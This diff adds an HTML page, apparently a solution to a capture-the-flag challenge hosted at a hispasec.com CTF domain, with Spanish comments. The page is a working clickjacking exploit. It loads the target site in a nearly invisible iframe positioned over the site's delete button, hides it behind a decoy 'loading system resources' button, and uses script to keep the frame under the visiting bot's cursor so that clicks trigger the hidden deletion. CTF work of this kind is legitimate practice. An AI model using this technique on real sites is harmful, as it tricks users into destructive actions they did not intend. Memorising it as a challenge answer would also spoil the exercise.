@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { margin: 0; overflow: hidden; background: #f0f0f0; }
+        #objetivo {
+            width: 100vw; height: 100vh;
+            border: none; background: white;
+            cursor: pointer;
+        }
+        #victim-container {
+            position: absolute;
+            width: 100px; /* Tamaño pequeño para que el clic sea preciso */
+            height: 50px;
+            overflow: hidden;
+            opacity: 0.0001; /* Invisible */
+            z-index: 999;
+            pointer-events: none; /* Al principio no estorba */
+        }
+        iframe {
+            position: absolute;
+            top: -815px; /* Ajuste del botón de borrar */
+            left: -10px;
+            width: 1000px;
+            height: 2000px;
+        }
+    </style>
+</head>
+<body>
+    <button id="objetivo">CARGANDO RECURSOS DEL SISTEMA...</button>
+    
+    <div id="victim-container">
+        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+    </div>
+
+    <script>
+        const container = document.getElementById('victim-container');
+        // El iframe sigue al ratón del bot
+        window.addEventListener('mousemove', (e) => {
+            container.style.left = (e.pageX - 50) + 'px';
+            container.style.top = (e.pageY - 25) + 'px';
+            container.style.pointerEvents = 'auto'; // Ahora sí recibe clics
+        });
+    </script>
+</body>
+</html>
